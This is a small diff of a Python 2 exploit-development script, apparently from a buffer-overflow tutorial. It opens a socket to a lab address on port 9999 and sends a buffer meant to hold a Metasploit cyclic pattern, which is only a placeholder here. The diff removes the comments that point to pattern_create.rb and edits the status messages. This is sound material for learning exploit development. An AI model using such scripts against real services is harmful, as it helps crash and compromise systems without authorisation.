@@ -11,10 +11,6 @@ import socket
 import sys
 from time import sleep
 
-# cp 2-crash.py 3-pattern.py
-# updatedb
-# locate pattern_create.rb
-# /usr/share/metasploit-framework/tools/exploit/pattern_create.rb -l 650
 pattern = '<enter pattern here>'
 
 # buffer = 'A' * 600
@@ -26,12 +22,12 @@ try:
   s.connect(('172.16.3.40',9999))
   s.recv(1024)
 
-  print '[*] Sending buffer.'
+  print '[*] Sending buffer...'
   s.send(buffer + '\r\n')
   s.close()
 
 except:
-  print '[*] Could not connect to target, exiting.'
+  print '[!] Could not connect to target, exiting.'
   sys.exit()
 
 ```
